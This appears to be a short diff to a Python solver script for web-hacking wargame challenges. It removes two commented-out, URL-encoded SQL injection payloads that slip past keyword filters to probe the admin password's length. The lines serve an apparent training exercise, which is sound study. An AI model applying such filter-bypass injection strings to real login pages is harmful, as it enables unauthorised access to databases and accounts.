@@ -1,7 +1,3 @@
-#chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1234&no=1||!(id%0anot%0ain%0a("admin")||length(pw)not%0ain(8))
-
-#chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=1234%27%20||!(id%20not%20like%20%27admin%27||length(pw)not%20like%208)%23
-
 import requests
 from dotenv import load_dotenv
 import os
